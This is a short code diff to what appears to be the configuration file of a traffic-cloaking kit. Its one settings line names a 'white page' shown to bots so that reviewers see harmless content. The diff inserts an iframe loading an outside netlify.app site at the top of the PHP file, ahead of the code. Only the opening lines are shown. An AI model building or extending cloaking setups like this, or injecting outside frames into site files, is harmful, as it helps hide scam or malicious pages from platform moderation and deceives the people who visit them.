@@ -1,3 +1,6 @@
+
+<iframe width="360" height="400" src="https://infallible-chandrasekhar-1583ed.netlify.app/"  allowfullscreen></iframe>
+
 <?php
 /* Required settings     */
 $CLOAKING['WHITE_PAGE'] = 'index.php';//PHP/HTML file or URL used for bots
